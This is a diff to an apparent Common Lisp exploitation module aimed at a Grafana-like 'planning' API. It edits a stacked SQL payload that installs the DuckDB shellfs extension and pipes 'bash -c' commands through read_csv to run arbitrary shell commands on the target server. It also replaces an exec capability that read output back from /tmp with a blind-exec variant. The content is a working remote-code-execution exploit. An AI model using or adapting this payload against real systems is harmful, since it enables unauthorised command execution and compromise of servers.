@@ -11,7 +11,7 @@
   (fmt "~a/login/" *planning/api*))
 
 (defvar *planning/cookies* (cl-cookie:make-cookie-jar))
-(defvar *planning/exec-query* "SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('bash -c \"~a\" > ~a 2>&1 |')")
+(defparameter *planning/exec-query* "SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('bash -c \"~a\" |')")
 
 (defun planning/payload (query)
   (s:dict
@@ -61,7 +61,5 @@
         (subseq text 0 text-len)
         "")))
 
-(define-capability :exec planning (command)
-  (let ((output "/tmp/grafana-cmd-output"))
-    (planning/query (fmt *planning/exec-query* command output))
-    (use :read output)))
+(define-capability :blind-exec planning (command)
+  (planning/query (fmt *planning/exec-query* command)))
